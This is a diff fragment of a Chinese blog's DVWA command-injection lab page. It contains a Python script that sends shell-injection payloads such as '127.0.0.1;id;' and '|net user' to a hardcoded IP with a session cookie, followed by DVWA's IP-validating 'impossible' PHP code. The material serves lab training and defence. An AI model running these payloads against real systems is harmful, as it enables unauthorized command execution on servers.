class="hljs-string">'payloads'</span>:[<br>                <span class="hljs-string">'127.0.0.1;id;'</span>,<br>                <span class="hljs-string">'127.0.0.1&amp;;&amp;id'</span>,<br>                <span class="hljs-string">'127.0.0.1&amp;id'</span>,<br>                <span class="hljs-string">'127.0.0.1|id'</span>,<br>                <span class="hljs-string">'127.0.0.1||id'</span>,<br>                <span class="hljs-string">'testcmdinjection&amp;id'</span>,<br>                <span class="hljs-string">'testcmdinjection|id'</span>,<br>                <span class="hljs-string">'testcmdinjection||id'</span>,<br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">'name'</span>:<span class="hljs-string">'net user'</span>,<br>            <span class="hljs-string">'pattern'</span>:<span class="hljs-string">r'Administrator'</span>,<br>            <span class="hljs-string">'payloads'</span>:[<br>                <span class="hljs-string">'127.0.0.1&amp;;&amp;net user'</span>,<br>                <span class="hljs-string">'127.0.0.1&amp;net user'</span>,<br>                <span class="hljs-string">'127.0.0.1|net user'</span>,<br>                <span class="hljs-string">'testcmdinjection&amp;net user'</span>,<br>                <span class="hljs-string">'testcmdinjection|net user'</span>,<br>                <span class="hljs-string">'testcmdinjection||net user'</span>,<br>            ]<br>        &#125;,<br>    ]<br>    datas = itertools.product([addr],[headers],payloads)<br>    executor = ThreadPoolExecutor(max_workers=WORKERS)<br>    <span class="hljs-keyword">for</span> success,name,payload <span class="hljs-keyword">in</span> executor.map(injection,datas):<br>        <span class="hljs-keyword">if</span> success:<br>            print(<span class="hljs-string">'+ name:'</span>,name,<span class="hljs-string">',payload:'</span>,payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    server = (<span class="hljs-string">'124.70.137.227'</span>,<span class="hljs-number">80</span>,)<br>    headers = &#123;<br>        <span class="hljs-string">'Cookie'</span> : <span class="hljs-string">'security=high; PHPSESSID=gqhrhpesfenrmv2veseur4orb6'</span><br>    &#125;<br>    main(server,headers)<br></code></pre></td></tr></table></figure>
 
-import re
-from concurrent.futures.thread import ThreadPoolExecutor
-import itertools
-
-import requests
-
-WORKERS = 10
-
-
-def injection(data):
-    addr,headers,payload = data
-    url = &#39;http://{0}:{1}/dvwa/vulnerabilities/exec/&#39;.format(*addr)
-    name = payload[&#39;name&#39;]
-    pattern = payload[&#39;pattern&#39;]
-    for pld in payload[&#39;payloads&#39;]:
-        params = {
-            &#39;ip&#39; : pld,
-            &#39;Submit&#39; : &#39;Submit&#39;
-        }
-        response = requests.post(url,params,headers=headers)
-        if response.ok and re.search(pattern,response.text,re.I):
-            return True,name,pld
-    return False,name,None
-
-def main(addr,headers):
-    payloads = [
-            {
-                &#39;name&#39;:&#39;id&#39;,
-                &#39;pattern&#39;:r&#39;uid=\d&#39;,
-                &#39;payloads&#39;:[
-                &#39;127.0.0.1;id;&#39;,
-                &#39;127.0.0.1&amp;;&amp;id&#39;,
-                &#39;127.0.0.1&amp;id&#39;,
-                &#39;127.0.0.1|id&#39;,
-                &#39;127.0.0.1||id&#39;,
-                &#39;testcmdinjection&amp;id&#39;,
-                &#39;testcmdinjection|id&#39;,
-                &#39;testcmdinjection||id&#39;,
-            ]
-        },
-        {
-            &#39;name&#39;:&#39;net user&#39;,
-            &#39;pattern&#39;:r&#39;Administrator&#39;,
-            &#39;payloads&#39;:[
-                &#39;127.0.0.1&amp;;&amp;net user&#39;,
-                &#39;127.0.0.1&amp;net user&#39;,
-                &#39;127.0.0.1|net user&#39;,
-                &#39;testcmdinjection&amp;net user&#39;,
-                &#39;testcmdinjection|net user&#39;,
-                &#39;testcmdinjection||net user&#39;,
-            ]
-        },
-    ]
-    datas = itertools.product([addr],[headers],payloads)
-    executor = ThreadPoolExecutor(max_workers=WORKERS)
-    for success,name,payload in executor.map(injection,datas):
-        if success:
-            print(&#39;+ name:&#39;,name,&#39;,payload:&#39;,payload)
-
-if __name__ == &#39;__main__&#39;:
-    server = (&#39;124.70.137.227&#39;,80,)
-    headers = {
-        &#39;Cookie&#39; : &#39;security=high; PHPSESSID=gqhrhpesfenrmv2veseur4orb6&#39;
-    }
-    main(server,headers)</code></pre>
 <p>使用：</p>
 <ul>
 <li>从浏览器中 copy 登陆成功后的 cookie 信息</li>
@@ -961,47 +687,8 @@ if __name__ == &#39;__main__&#39;:
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Impossible.png" alt="SecurityLevel_Impossible"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre><code class="php">&lt;?php
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( $_REQUEST[ <span class="hljs-string">'user_token'</span> ], $_SESSION[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    $target = $_REQUEST[ <span class="hljs-string">'ip'</span> ];<br>    $target = stripslashes( $target );<br><br>    <span class="hljs-comment">// Split the IP into 4 octects</span><br>    $octet = explode( <span class="hljs-string">"."</span>, $target );<br><br>    <span class="hljs-comment">// Check IF each octet is an integer</span><br>    <span class="hljs-keyword">if</span>( ( is_numeric( $octet[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="hljs-number">4</span> ) ) &#123;<br>        <span class="hljs-comment">// If all 4 octets are int's put the IP back together.</span><br>        $target = $octet[<span class="hljs-number">0</span>] . <span class="hljs-string">'.'</span> . $octet[<span class="hljs-number">1</span>] . <span class="hljs-string">'.'</span> . $octet[<span class="hljs-number">2</span>] . <span class="hljs-string">'.'</span> . $octet[<span class="hljs-number">3</span>];<br><br>        <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>        <span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) &#123;<br>            <span class="hljs-comment">// Windows</span><br>            $cmd = shell_exec( <span class="hljs-string">'ping  '</span> . $target );<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// *nix</span><br>            $cmd = shell_exec( <span class="hljs-string">'ping  -c 4 '</span> . $target );<br>        &#125;<br><br>        <span class="hljs-comment">// Feedback for the end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Ops. Let the user name theres a mistake</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
-    // Check Anti-CSRF token
-    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
-
-    // Get input
-    $target = $_REQUEST[ &#39;ip&#39; ];
-    $target = stripslashes( $target );
-
-    // Split the IP into 4 octects
-    $octet = explode( &quot;.&quot;, $target );
-
-    // Check IF each octet is an integer
-    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) {
-        // If all 4 octets are int&#39;s put the IP back together.
-        $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];
-
-        // Determine OS and execute the ping command.
-        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {
-            // Windows
-            $cmd = shell_exec( &#39;ping  &#39; . $target );
-        }
-        else {
-            // *nix
-            $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );
-        }
-
-        // Feedback for the end user
-        echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
-    }
-    else {
-        // Ops. Let the user name theres a mistake
-        echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;;
-    }
-}
-
-// Generate Anti-CSRF token
-generateSessionToken();
-
-?&gt; </code></pre>
 <ul>
 <li>在后端对IP地址的格式进行验证，无法注入其他命令。</li>
 </ul>
@@ -1649,7 +1336,7 @@ generateSessionToken();
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">207.6k</span>&nbsp;字
+                class="white-color">203.2k</span>&nbsp;字
             
             
             
